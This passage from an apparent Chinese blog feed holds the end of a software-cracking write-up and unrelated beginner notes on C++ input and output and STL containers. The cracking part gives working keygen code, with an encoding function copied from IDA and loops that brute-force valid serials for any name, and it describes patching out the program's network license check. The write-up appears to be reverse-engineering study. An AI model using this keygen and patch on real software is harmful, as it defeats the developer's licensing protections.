class="number">0x330e0be2</span>, <span class="number">0x5b3c0ddd</span>, <span class="number">0x495d3c60</span>,</span><br><span class="line">	<span class="number">0x53bd59a6</span>, <span class="number">0x4c5e6d91</span>, <span class="number">0x49d9318d</span>, <span class="number">0x103d5079</span>, <span class="number">0x61ce42e3</span>, <span class="number">0x7ed5121d</span>, <span class="number">0x14e160ed</span>, <span class="number">0x212d4ef2</span>, <span class="number">0x270133f0</span>, <span class="number">0x62435a96</span>, <span class="number">0x1fa75e8b</span>, <span class="number">0x6f092fbe</span>, <span class="number">0x4a000d49</span>, <span class="number">0x57ae1c70</span>, <span class="number">0x004e2477</span>, <span class="number">0x561e7e72</span>,</span><br><span class="line">	<span class="number">0x468c0033</span>, <span class="number">0x5dcc2402</span>, <span class="number">0x78507ac6</span>, <span class="number">0x58af24c7</span>, <span class="number">0x0df62d34</span>, <span class="number">0x358a4708</span>, <span class="number">0x3cfb1e11</span>, <span class="number">0x2b71451c</span>, <span class="number">0x77a75295</span>, <span class="number">0x56890721</span>, <span class="number">0x0fef75f3</span>, <span class="number">0x120f24f1</span>, <span class="number">0x01990ae7</span>, <span class="number">0x339c4452</span>, <span class="number">0x27a15b8e</span>, <span class="number">0x0ba7276d</span>,</span><br><span class="line">	<span class="number">0x60dc1b7b</span>, <span class="number">0x4f4b7f82</span>, <span class="number">0x67db7007</span>, <span class="number">0x4f4a57d9</span>, <span class="number">0x621252e8</span>, <span class="number">0x20532cfc</span>, <span class="number">0x6a390306</span>, <span class="number">0x18800423</span>, <span class="number">0x19f3778a</span>, <span class="number">0x462316f0</span>, <span class="number">0x56ae0937</span>, <span class="number">0x43c2675c</span>, <span class="number">0x65ca45fd</span>, <span class="number">0x0d604ff2</span>, <span class="number">0x0bfd22cb</span>, <span class="number">0x3afe643b</span>,</span><br><span class="line">	<span class="number">0x3bf67fa6</span>, <span class="number">0x44623579</span>, <span class="number">0x184031f8</span>, <span class="number">0x32174f97</span>, <span class="number">0x4c6a092a</span>, <span class="number">0x5fb50261</span>, <span class="number">0x01650174</span>, <span class="number">0x33634af1</span>, <span class="number">0x712d18f4</span>, <span class="number">0x6e997169</span>, <span class="number">0x5dab7afe</span>, <span class="number">0x7c2b2ee8</span>, <span class="number">0x6edb75b4</span>, <span class="number">0x5f836fb6</span>, <span class="number">0x3c2a6dd6</span>, <span class="number">0x292d05c2</span>,</span><br><span class="line">	<span class="number">0x052244db</span>, <span class="number">0x149a5f4f</span>, <span class="number">0x5d486540</span>, <span class="number">0x331d15ea</span>, <span class="number">0x4f456920</span>, <span class="number">0x483a699f</span>, <span class="number">0x3b450f05</span>, <span class="number">0x3b207c6c</span>, <span class="number">0x749d70fe</span>, <span class="number">0x417461f6</span>, <span class="number">0x62b031f1</span>, <span class="number">0x2750577b</span>, <span class="number">0x29131533</span>, <span class="number">0x588c3808</span>, <span class="number">0x1aef3456</span>, <span class="number">0x0f3c00ec</span>,</span><br><span class="line">	<span class="number">0x7da74742</span>, <span class="number">0x4b797a6c</span>, <span class="number">0x5ebb3287</span>, <span class="number">0x786558b8</span>, <span class="number">0x00ed4ff2</span>, <span class="number">0x6269691e</span>, <span class="number">0x24a2255f</span>, <span class="number">0x62c11f7e</span>, <span class="number">0x2f8a7dcd</span>, <span class="number">0x643b17fe</span>, <span class="number">0x778318b8</span>, <span class="number">0x253b60fe</span>, <span class="number">0x34bb63a3</span>, <span class="number">0x5b03214f</span>, <span class="number">0x5f1571f4</span>, <span class="number">0x1a316e9f</span>,</span><br><span class="line">	<span class="number">0x7acf2704</span>, <span class="number">0x28896838</span>, <span class="number">0x18614677</span>, <span class="number">0x1bf569eb</span>, <span class="number">0x0ba85ec9</span>, <span class="number">0x6aca6b46</span>, <span class="number">0x1e43422a</span>, <span class="number">0x514d5f0e</span>, <span class="number">0x413e018c</span>, <span class="number">0x307626e9</span>, <span class="number">0x01ed1dfa</span>, <span class="number">0x49f46f5a</span>, <span class="number">0x461b642b</span>, <span class="number">0x7d7007f2</span>, <span class="number">0x13652657</span>, <span class="number">0x6b160bc5</span>,</span><br><span class="line">	<span class="number">0x65e04849</span>, <span class="number">0x1f526e1c</span>, <span class="number">0x5a0251b6</span>, <span class="number">0x2bd73f69</span>, <span class="number">0x2dbf7acd</span>, <span class="number">0x51e63e80</span>, <span class="number">0x5cf2670f</span>, <span class="number">0x21cd0a03</span>, <span class="number">0x5cff0261</span>, <span class="number">0x33ae061e</span>, <span class="number">0x3bb6345f</span>, <span class="number">0x5d814a75</span>, <span class="number">0x257b5df4</span>, <span class="number">0x0a5c2c5b</span>, <span class="number">0x16a45527</span>, <span class="number">0x16f23945</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 从IDA拷贝出来的用于加密name字符串的函数</span></span><br><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">EncodeUserName</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1, <span class="keyword">int</span> a2, <span class="keyword">char</span> a3, <span class="keyword">char</span> a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span> *v4; <span class="comment">// edx@1</span></span><br><span class="line">	<span class="keyword">signed</span> <span class="keyword">int</span> v5; <span class="comment">// esi@1</span></span><br><span class="line">	<span class="keyword">signed</span> <span class="keyword">int</span> v6; <span class="comment">// edi@1</span></span><br><span class="line">	<span class="keyword">unsigned</span> __int8 v7; <span class="comment">// bl@2</span></span><br><span class="line">	<span class="keyword">int</span> v8; <span class="comment">// eax@3</span></span><br><span class="line">	<span class="keyword">int</span> v9; <span class="comment">// ecx@3</span></span><br><span class="line">	<span class="keyword">int</span> v10; <span class="comment">// ecx@4</span></span><br><span class="line">	<span class="keyword">int</span> result; <span class="comment">// eax@4</span></span><br><span class="line">	<span class="keyword">int</span> v12; <span class="comment">// ecx@5</span></span><br><span class="line">	<span class="keyword">unsigned</span> __int8 v13; <span class="comment">// [sp+8h] [bp-10h]@2</span></span><br><span class="line">	<span class="keyword">unsigned</span> __int8 v14; <span class="comment">// [sp+Ch] [bp-Ch]@2</span></span><br><span class="line">	<span class="keyword">unsigned</span> __int8 v15; <span class="comment">// [sp+10h] [bp-8h]@2</span></span><br><span class="line">	<span class="keyword">int</span> v16; <span class="comment">// [sp+14h] [bp-4h]@1</span></span><br><span class="line"></span><br><span class="line">	v4 = a1;</span><br><span class="line">	v16 = <span class="number">0</span>;</span><br><span class="line">	v5 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">	v6 = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (v5 &lt;= <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		result = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		v13 = <span class="number">0</span>;</span><br><span class="line">		v14 = <span class="number">0</span>;</span><br><span class="line">		v7 = <span class="number">15</span> * a4;</span><br><span class="line">		v15 = <span class="number">17</span> * a3;</span><br><span class="line">		<span class="keyword">do</span></span><br><span class="line">		&#123;</span><br><span class="line">			v8 = <span class="built_in">toupper</span>(v4[v6]);</span><br><span class="line">			v9 = v16 + g_EncodeArray[v8];</span><br><span class="line">			<span class="keyword">if</span> (a2)</span><br><span class="line">			&#123;</span><br><span class="line">				v10 = g_EncodeArray[v7]</span><br><span class="line">					+ g_EncodeArray[v15]</span><br><span class="line">					+ g_EncodeArray[(<span class="keyword">unsigned</span> __int8)(v8 + <span class="number">47</span>)] * (g_EncodeArray[(<span class="keyword">unsigned</span> __int8)(v8 + <span class="number">13</span>)] ^ v9);</span><br><span class="line">				result = g_EncodeArray[v14] + v10;</span><br><span class="line">				v16 = g_EncodeArray[v14] + v10;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				v12 = g_EncodeArray[v7]</span><br><span class="line">					+ g_EncodeArray[v15]</span><br><span class="line">					+ g_EncodeArray[(<span class="keyword">unsigned</span> __int8)(v8 + <span class="number">23</span>)] * (g_EncodeArray[(<span class="keyword">unsigned</span> __int8)(v8 + <span class="number">63</span>)] ^ v9);</span><br><span class="line">				result = g_EncodeArray[v13] + v12;</span><br><span class="line">				v16 = g_EncodeArray[v13] + v12;</span><br><span class="line">			&#125;</span><br><span class="line">			v14 += <span class="number">19</span>;</span><br><span class="line">			++v6;</span><br><span class="line">			v15 += <span class="number">9</span>;</span><br><span class="line">			v7 += <span class="number">13</span>;</span><br><span class="line">			v13 += <span class="number">7</span>;</span><br><span class="line">			v4 = a1;</span><br><span class="line">		&#125; <span class="keyword">while</span> (v6 &lt; v5);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// 1 初始化</span></span><br><span class="line">	srand(time(<span class="literal">NULL</span>));<span class="comment">// 设置随机数种子</span></span><br><span class="line">	<span class="keyword">int</span> dwRet = rand() % <span class="number">0x3E8</span>;		<span class="comment">//（v1中JA的条件为不可大于0x3e8</span></span><br><span class="line">	byte K[<span class="number">10</span>] = &#123; <span class="number">0x11</span>,<span class="number">0x22</span>,<span class="number">0x33</span>,<span class="number">0x9C</span>,<span class="number">0x55</span>,<span class="number">0x66</span>,<span class="number">0x77</span>,<span class="number">0x88</span>,<span class="number">0x99</span>,<span class="number">0xAA</span> &#125;;<span class="comment">// 密码字符串转为16进制字节数组、K[3]只可为9C/FC/AC，以9c为例</span></span><br><span class="line">	<span class="comment">// 2 通过用户名 生成对应的key数组</span></span><br><span class="line">	<span class="keyword">char</span> szName[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"please input name:&gt;&gt; "</span>);</span><br><span class="line">	scanf_s(<span class="string">"%s"</span>, szName, <span class="number">50</span>);</span><br><span class="line">	DWORD dwKey = EncodeUserName(szName, <span class="number">1</span>, <span class="number">0</span>, dwRet);<span class="comment">// 生成与name相对应的key</span></span><br><span class="line">	<span class="comment">// 3 需满足的条件</span></span><br><span class="line">	<span class="comment">/* </span></span><br><span class="line"><span class="comment">		K[4] == 返回值eax 最低位</span></span><br><span class="line"><span class="comment">		K[5] == 返回值eax 第二位(通过右移取最低位来实现</span></span><br><span class="line"><span class="comment">		K[6] == 返回值eax 第三位</span></span><br><span class="line"><span class="comment">		K[7] == 返回值eax 第四位</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	K[<span class="number">4</span>] = dwKey &amp; <span class="number">0xFF</span>;</span><br><span class="line">	K[<span class="number">5</span>] = dwKey &gt;&gt; <span class="number">8</span> &amp; <span class="number">0xFF</span>;</span><br><span class="line">	K[<span class="number">6</span>] = dwKey &gt;&gt; <span class="number">16</span> &amp; <span class="number">0xFF</span>;</span><br><span class="line">	K[<span class="number">7</span>] = dwKey &gt;&gt; <span class="number">24</span> &amp; <span class="number">0xFF</span>;</span><br><span class="line">	<span class="comment">// 4 穷举剩余的字节-0、6</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">		第一个call中：处理k[0]、k[6]</span></span><br><span class="line"><span class="comment">		AL= (k[0]^k[6]^0x18 + 0x3D) ^ 0xA7</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// 随机生成k0、k6（小于0xFF</span></span><br><span class="line">		byte k0 = rand() % <span class="number">0xFF</span>;</span><br><span class="line">		byte k6 = K[<span class="number">6</span>];		<span class="comment">// v1中随机生成，v2中通过加密函数确定</span></span><br><span class="line">		<span class="comment">// 使用k0、k6构造 al</span></span><br><span class="line">		byte al = (k0 ^ k6 ^ <span class="number">0x18</span> + <span class="number">0x3D</span>) ^ <span class="number">0xA7</span>;</span><br><span class="line">		<span class="comment">// 若满足第一个JE前的条件，则保存</span></span><br><span class="line">		<span class="keyword">if</span> (al &gt;= <span class="number">9</span>)	<span class="comment">//v1中 != 0, v2中JBE的条件为 &gt;= 9</span></span><br><span class="line">		&#123;</span><br><span class="line">			K[<span class="number">0</span>] = k0;</span><br><span class="line">			K[<span class="number">6</span>] = k6;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 5 穷举剩余的字节 - 1、7、2、5</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">		第二个call中：处理 K[1]、K[7]、k[2]、k[5]</span></span><br><span class="line"><span class="comment">		esi = (((K[1] ^ K[7]) ^ 0xFF) * 0x100 + k[2] ^ k[5] &amp; 0xFF) &amp; 0xFFFF</span></span><br><span class="line"><span class="comment">		eax =(((eax^0x7892)+0x4d30)^0x3421) &amp;0xFFFF</span></span><br><span class="line"><span class="comment">		edx = 余数；判断是否为0: 为0返回eax=商、不为0返回eax=0</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// 随机生成k1、7、2、5（小于0xFF</span></span><br><span class="line">		byte k1 = rand() % <span class="number">0xFF</span>;</span><br><span class="line">		byte k7 = K[<span class="number">7</span>];<span class="comment">// v1中随机生成，v2中通过加密函数确定</span></span><br><span class="line">		byte k2 = rand() % <span class="number">0xFF</span>;</span><br><span class="line">		byte k5 = K[<span class="number">5</span>];<span class="comment">// v1中随机生成，v2中通过加密函数确定</span></span><br><span class="line">		<span class="comment">// 使用k1、7、2、5构造esi，即第二个call传入的参数，在call内部先提取到eax中</span></span><br><span class="line">		DWORD esi = (((k1 ^ k7) &amp; <span class="number">0xFF</span>) * <span class="number">0x100</span> + k2 ^ k5 &amp; <span class="number">0xFF</span>) &amp; <span class="number">0xFFFF</span>;</span><br><span class="line">		<span class="comment">// 通过传入的参数构造eax，即后面除法中的被除数</span></span><br><span class="line">		DWORD eax = (((esi ^ <span class="number">0x7892</span>) + <span class="number">0x4d30</span>) ^ <span class="number">0x3421</span>) &amp; <span class="number">0xFFFF</span>;</span><br><span class="line">		<span class="comment">// 余数为0返回商，也就满足返回值不等于0，同时指定 商即返回值&lt;= 0x3EB（同时满足后面两个条件，则保存</span></span><br><span class="line">		<span class="keyword">if</span> (eax % <span class="number">0xB</span> == <span class="number">0</span> &amp;&amp; eax/<span class="number">0xB</span> == dwRet)<span class="comment">//v1中 &lt;= 0x3EB，v2中 == dwRet = rand() % 0x3E8，同义</span></span><br><span class="line">		&#123;</span><br><span class="line">			K[<span class="number">1</span>] = k1;</span><br><span class="line">			K[<span class="number">7</span>] = k7;</span><br><span class="line">			K[<span class="number">2</span>] = k2;</span><br><span class="line">			K[<span class="number">5</span>] = k5;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 6 输出符合条件的序列</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%02X%02X-%02X%02X-%02X%02X-%02X%02X-%02X%02X\n"</span>,K[<span class="number">0</span>], K[<span class="number">1</span>], K[<span class="number">2</span>], K[<span class="number">3</span>], K[<span class="number">4</span>],K[<span class="number">5</span>], K[<span class="number">6</span>], K[<span class="number">7</span>], K[<span class="number">8</span>], K[<span class="number">9</span>]);	</span><br><span class="line">	system(<span class="string">"pause"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>运行，输入name，输出相应的序列号，测试，成功</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-02-15-115442.jpg" alt="image-20200215180624176"></p>
</li>
</ul>
<h2 id="2-6-网络验证"><a href="#2-6-网络验证" class="headerlink" title="2.6-网络验证"></a>2.6-网络验证</h2><p>正确序列号使用一段时间后就会报错，因为其远程连接服务器进行了网络验证</p>
<ol>
<li><p>标志位判断，直接JMP跳过</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-02-15-115445.jpg" alt="image-20200215180644023"></p>
</li>
<li><p>网络验证函数内部，使其一直返回1（也就是验证正确才返回的值</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-02-15-115424.jpg" alt="image-20200215180700592"></p>
</li>
</ol>
<h1 id="03-总结"><a href="#03-总结" class="headerlink" title="03-总结"></a>03-总结</h1><ol>
<li>边分析边测试的方法</li>
<li>逆向真的是体力活，说难也没太难，就得有耐心</li>
<li>要细心，失之毫厘，差之千里</li>
</ol>
<h1 id="04-参考"><a href="#04-参考" class="headerlink" title="04-参考"></a>04-参考</h1><ol>
<li>15PB视频课程-逆向工程实战之软件算法分析</li>
</ol>
<p>PS：流水账的写法，图片说明较少，简单为日后翻看方便</p>
<p>首发于看雪论坛：<a href="https://bbs.pediy.com/thread-257695.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-257695.htm</a></p>
]]></content>
      <categories>
        <category>软件安全/逆向</category>
      </categories>
      <tags>
        <tag>软件破解</tag>
      </tags>
  </entry>
  <entry>
    <title>算法基础</title>
    <url>/2019/05/11/etc/%E7%AE%97%E6%B3%95%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h1 id="算法基础"><a href="#算法基础" class="headerlink" title="算法基础"></a>算法基础</h1><h2 id="01-“软件”要求"><a href="#01-“软件”要求" class="headerlink" title="01-“软件”要求"></a>01-“软件”要求</h2><h3 id="1-1-解析题目"><a href="#1-1-解析题目" class="headerlink" title="1.1-解析题目"></a>1.1-解析题目</h3><ul>
<li>背景介绍、问题提出</li>
<li>输入输出要求</li>
<li>输入输出样例</li>
<li>时间、空间限制及其它信息<a id="more"></a></li>
</ul>
<h3 id="1-2-输入输出"><a href="#1-2-输入输出" class="headerlink" title="1.2-输入输出"></a>1.2-输入输出</h3><ul>
<li><p>输入，以EOF结束</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="built_in">scanf</span>(“%d”, &amp;n) != EOF) 	<span class="comment">// C</span></span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; n)	<span class="comment">// C++</span></span><br><span class="line"><span class="comment">// EOF：win-ctrl+z；mac-control+d</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>输入，以0结束</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n)!=EOF &amp;&amp; n!=<span class="number">0</span>); <span class="comment">// C</span></span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">cin</span>&gt;&gt;n &amp;&amp; n!=<span class="number">0</span>); <span class="comment">// C++</span></span><br><span class="line"><span class="comment">// 以0结束比EOF严格，故要&amp;“以EOF结束的”</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>输入，先输入case数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cin</span> &gt;&gt; n;	<span class="comment">// C: scanf(“%d”, &amp;n);</span></span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;n; ++i)</span><br></pre></td></tr></table></figure>
</li>
<li><p>整行输入</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 法1，（xcode提示gets unsafe）</span></span><br><span class="line"><span class="keyword">char</span> buffer[<span class="number">256</span>];</span><br><span class="line">gets(buffer);</span><br><span class="line"><span class="comment">// 法2</span></span><br><span class="line"><span class="built_in">string</span> buffer;</span><br><span class="line">getline(<span class="built_in">cin</span>, buffer);</span><br></pre></td></tr></table></figure>
</li>
<li><p>输出，每个case之后有空行</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cout</span>&lt;&lt;i&lt;&lt;<span class="built_in">endl</span>&lt;&lt;<span class="built_in">endl</span>;	<span class="comment">// C++</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n\n"</span>, <span class="keyword">case</span>);		<span class="comment">// C</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>输出，case之间用空行分隔</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//除了第一个只输出case，其它都是空行+case</span></span><br><span class="line"><span class="comment">//即1-空2-空3-空x</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">8</span>; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(i&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;i&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="1-3-常见错误类型"><a href="#1-3-常见错误类型" class="headerlink" title="1.3-常见错误类型"></a>1.3-常见错误类型</h3><ul>
<li>Compilation Error  编译错误</li>
<li>Segmentation Fault  数组越界、堆栈溢出等</li>
<li>Time Limit Error  运行时间超限</li>
<li>Memory Limit Error  内存超限</li>
<li>Wrong Answer  答案错误</li>
<li>Presentation Error  格式错误</li>
<li>Output Limit Error  输出超限</li>
<li>Restricted Function  非法函数</li>
</ul>
<h3 id="1-4-程序调试"><a href="#1-4-程序调试" class="headerlink" title="1.4-程序调试"></a>1.4-程序调试</h3><ul>
<li>重新读题、检查代码<ul>
<li>数组是否开的够大（大数组开到全局，避免堆栈溢出）</li>
<li>int ：2^31 ~ 2^31 – 1</li>
<li>long long largenumbe： -2^63 ~ 2^63 - 1</li>
<li>printf(“%lld\n”, largenumber);</li>
</ul>
</li>
<li>构造测试数据<ul>
<li>题目提供的测试数据一般较弱</li>
<li>自行构造边界数据、特殊数据</li>
</ul>
</li>
</ul>
<h3 id="1-5-复杂度估计"><a href="#1-5-复杂度估计" class="headerlink" title="1.5-复杂度估计"></a>1.5-复杂度估计</h3><ul>
<li><p>估计程序空间复杂度</p>
<ul>
<li><p>默认空间限制：32M</p>
</li>
<li><p><code>char c[1000000];</code>  // 1M</p>
</li>
<li><p><code>int a[1000][1000];</code>  // 4M</p>
</li>
</ul>
</li>
<li><p>估计程序时间复杂度</p>
<ul>
<li>一般ZOJ可以接受的时间复杂度为10^6~10^7，基本为1s</li>
</ul>
</li>
<li><p>| 数据范围 |    允许的时间复杂度     |<br>| :——: | :———————: |<br>|  10^20   |         O(logN)         |<br>|   10^9   |   O(logN)  O(sqrt(N))   |<br>|   10^6   |          O(N)           |<br>|   10^5   |        O(N logN)        |<br>|   10^4   | O(N logN)  O(N sqrt(N)) |<br>|   10^3   |         O(N^2)          |<br>|   10^2   |         O(N^3)          |<br>|    20    |         O(2^N)          |</p>
</li>
</ul>
<h2 id="02-“硬件”要求"><a href="#02-“硬件”要求" class="headerlink" title="02-“硬件”要求"></a>02-“硬件”要求</h2><h3 id="2-1-学好数据结构"><a href="#2-1-学好数据结构" class="headerlink" title="2.1-学好数据结构"></a>2.1-学好数据结构</h3><ul>
<li><p>常用数据结构：STL、String、树、图、Hash、并查集</p>
</li>
<li><p>String-字符串类</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 常见操作</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;		// 引入头文件</span></span></span><br><span class="line">s = <span class="string">"hello world"</span>;		<span class="comment">// 直接定义字符串</span></span><br><span class="line">s += <span class="string">"h"</span>;		<span class="comment">// 用+=拼接</span></span><br><span class="line">s2 = s + <span class="string">"asdf"</span>;		<span class="comment">// 用+构造新的</span></span><br><span class="line"><span class="keyword">if</span> (s &gt; s2)		<span class="comment">// 比较首字母ascii码，若相同则下一个</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 常用函数</span></span><br><span class="line">s.size()			<span class="comment">//字符串长度</span></span><br><span class="line">s.find(<span class="string">"hi"</span>)		<span class="comment">//查找子串，返回起始位置，不存在返回string::npos</span></span><br><span class="line">s.substr(<span class="number">0</span>, <span class="number">5</span>)		<span class="comment">//获取子串，与substr(5)同</span></span><br><span class="line">s.substr(a, b)		<span class="comment">//从a开始，截取b个（包括a位置）</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>STL容器：其实现了一些常见的数据结构</p>
<ul>
<li>vector：动态数组</li>
<li>list：链表</li>
<li>queue：队列</li>
<li>set：集合</li>
<li>map：字典、映射</li>
<li>priority_queue：优先队列</li>
</ul>
</li>
</ul>
<ul>
<li><p>Iterator-迭代器</p>
<ul>
<li>可以把iterator看成某种指针，指向容器内部</li>
<li>C语言中的指针就是一种特殊的Iterator</li>
<li>Iterator和指针一样支持 * 和 -&gt; 操作</li>
<li>可以用iterator的 ++ 运算符来遍历容器</li>
<li>一般的容器都提供了begin() 和 end() 两个函数来得到指向容器头、尾的两个Iterator。其中begin指向头元素，end指向最后一个元素的后一个位置。</li>
</ul>
</li>
<li><p>vector-向量</p>
<ul>
<li><p>常用操作</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">arr.clear();	<span class="comment">//清空所有元素</span></span><br><span class="line">arr.push_back(<span class="number">5</span>);	<span class="comment">//在最后添加一个元素</span></span><br><span class="line">arr.pop_back();	<span class="comment">//删除最后一个元素</span></span><br><span class="line">arr.erase(arr.begin() + <span class="number">5</span>);	<span class="comment">//删除指针指向的元素</span></span><br><span class="line">arr.insert(arr.begin() + <span class="number">5</span>, <span class="number">4</span>);	<span class="comment">//指针指向的元素前插入新元素</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>vector VS 数组</p>
<ul>
<li>vector的灵活性较好，不需要考虑长度问题，可减少编程复杂度，使用起来和数组一样方便。</li>
<li>但是，vector的效率远低于数组，在效率要求较高时慎用</li>
</ul>
</li>
<li><p>vector的遍历</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 法1</span></span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::iterator vi=arr.begin(); vi!=arr.end(); ++vi) &#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; *vi &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 法2</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; v.size(); ++i) &#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; v[i] &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>queue-队列</p>
<ul>
<li><code>#include &lt;queue&gt; // 头文件</code><ul>
<li>特殊的线性表；</li>
<li>先进先出（FIFO）的数据结构；</li>
<li>只允许在表的前端（front）进行删除操作，在表的后端（rear）进行插入操作；</li>
<li>进行插入操作的端称为队尾，进行删除操作的成为队头；</li>
<li>队列中没有元素时，称为空队列</li>
<li>支持push 和 pop 操作</li>
</ul>
</li>
</ul>
</li>
<li><p>priority_queue-优先队列</p>
<ul>
<li><p><code>#include &lt; queue &gt; // 头文件</code></p>
<ul>
<li>用最大堆实现的优先队列；</li>
<li>priority_queue中的元素支持 &lt; 操作符；</li>
<li>priority_queue 不支持clear操作；</li>
</ul>
</li>
<li><p>常用操作</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">pq.top();	<span class="comment">//返回队列顶部的元素</span></span><br><span class="line">pq.push(<span class="number">5</span>);	<span class="comment">//将元素插入优先队列</span></span><br><span class="line">pq.pop();	<span class="comment">//删除队列顶部的元素</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>set-集合</p>
<ul>
<li><p><code>#include &lt;set&gt; //头文件</code></p>
<ul>
<li>有序的元素集合；</li>
<li>set中的元素也要支持 &lt; 操作符；</li>
<li>支持元素插入、删除和查找；</li>
<li>复杂度为O(logN)</li>
<li>双向迭代器，不支持随机访问</li>
</ul>
</li>
<li><p>常用操作</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span>&lt;<span class="keyword">int</span>&gt; s;	<span class="comment">//定义</span></span><br><span class="line">s.insert(<span class="number">3</span>);	<span class="comment">//插入元素</span></span><br><span class="line">s.erase(<span class="number">5</span>);	<span class="comment">//删除指针指向的值</span></span><br><span class="line"><span class="keyword">if</span> (s.find(<span class="number">5</span>) == s.end())	<span class="comment">// 如果5不在集合（若没找到就返回尾部的迭代器）</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>set的遍历</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="built_in">set</span>&lt;<span class="keyword">int</span>&gt;::iterator si=s.begin(); si!=s.end(); ++si) &#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; *si &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//遍历的顺序是有序的</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>map-映射</p>
<ul>
<li><p><code>#include &lt;map&gt; //头文件</code></p>
<ul>
<li>实现任意两个类型元素之间的映射（类似键值对）；</li>
<li><code>map&lt;string, int&gt; m;  // key, value</code>；</li>
<li>1个key最多只能对应1个value；</li>
</ul>
</li>
<li><p>常用操作</p>
